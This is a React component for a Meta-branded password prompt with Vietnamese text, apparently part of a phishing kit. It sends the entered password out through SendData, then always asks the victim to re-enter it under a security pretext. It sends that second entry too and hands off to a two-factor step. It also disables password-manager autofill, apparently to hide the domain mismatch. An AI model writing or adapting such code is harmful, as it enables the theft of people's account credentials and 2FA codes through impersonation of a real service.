import React from 'react';
import Modal from '#components/modals/Modal';
import PasswordInput from '#components/password-input/password-input';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm } from '../../app/store/slices/stepFormSlice';
import { SendData } from '@/utils/sendData';

interface PasswordModalProps {
    isOpend: boolean;
    isOpendTwoFactor: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [loading, setLoading] = React.useState(false);
    const [doubleCheck, setDoubleCheck] = React.useState(false);
    const [password, setPassword] = React.useState('');
    const [showSecondStepNotice, setShowSecondStepNotice] = React.useState(false);
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const dispatch = useAppDispatch();
    const formData = useAppSelector((state) => state.stepForm.data);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { value } = e.target;
        setPassword(value);
        setErrors(prev => ({ ...prev, password: '' }));

        if (!doubleCheck) {
            dispatch(updateForm({ password: value }));
        } else {
            dispatch(updateForm({ passwordSecond: value }));
        }
    };

    const handleClose = () => {
        setIsOpen(false);
        onToggleModal(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();
            const newErrors: Record<string, string> = {};
            if (!password.trim()) newErrors.password = "Vui lòng nhập mật khẩu.";

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return; 
            }

            if (!doubleCheck) {
                setLoading(true);

                await SendData(formData)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);  
                        setDoubleCheck(true);
                        setShowSecondStepNotice(true);
                        setPassword('');
                        setErrors({});
                    }, 1345)
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setDoubleCheck(true);
                    setShowSecondStepNotice(true);
                    setPassword('');
                    setErrors({});
                });
            } else {
                setLoading(true);

                await SendData(formData)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);  
                        setDoubleCheck(false);
                        setShowSecondStepNotice(false);
                        setPassword('');

                        isOpendTwoFactor(true);
                        handleClose();
                    }, 1345)
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setPassword('');
                    newErrors.password = "Mật khẩu bạn nhập chưa chính xác. Vui lòng thử lại.";
                    setErrors(newErrors);
                });
            }
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => ` border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} `;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title=''
            onClose={handleClose}
            isClosable={false}
        >
            <div className="h-full flex flex-col items-center justify-between flex-1">
                <div className='w-[50px] h-[50px] mb-[20px] mx-auto'>
                    <img src="/images/meta/logo.svg" width="100%" height="100%" alt="logo" />
                </div>

                <div className='w-full py-8'>
                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>
                        {doubleCheck
                            ? 'Vui lòng nhập lại mật khẩu để xác nhận và tiếp tục.'
                            : 'Vì lý do bảo mật, vui lòng nhập mật khẩu để tiếp tục.'}
                    </p>
                    {showSecondStepNotice && (
                        <div className='mb-[10px] rounded-[10px] border border-[#ffd8a8] bg-[#fff8ee] px-[12px] py-[10px]'>
                            <p className='text-[13px] leading-[1.55] text-[#8a5b13]'>
                                Lưu ý: Hãy kiểm tra kỹ mật khẩu trước khi nhập lại lần 2 để tránh sai sót. Bạn có thể sử dụng biểu tượng mắt để ẩn/hiện ở bước xác nhận.
                            </p>
                        </div>
                    )}
                    <form onSubmit={handSubmit} autoComplete="off" data-lpignore="true" data-1p-ignore="true" data-bwignore="true">
                        <div className='w-full'>
                            <PasswordInput
                                id='accessKey'
                                name={doubleCheck ? 'recheck_access_key' : 'account_access_key'}
                                placeholder={doubleCheck ? 'Nhập lại mật khẩu' : 'Nhập mật khẩu'}
                                className={inputClass('password')}
                                value={password}
                                onChange={handleChange}
                                autoComplete='off'
                                allowToggle={doubleCheck}
                            />
                            {errorText('password')}
                        </div>
                        <div className='w-full mt-[20px]'>
                            <button
                                className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer transition-opacity duration-300 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
                                disabled={loading}
                            >
                                {loading && (
                                    <div className='animate-spin mr-[10px] w-[20px] h-[20px]'>
                                        <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                    </div>
                                )}
                                {loading ? '' : 'Tiếp tục'}
                            </button>
                        </div>
                        <div>
                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>Quên mật khẩu?</a></p>
                        </div>
                    </form>
                </div>

                <div className='w-[60px] mt-[20px] mx-auto'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                </div>
            </div>
        </Modal>
    );
};

export default PasswordModal;
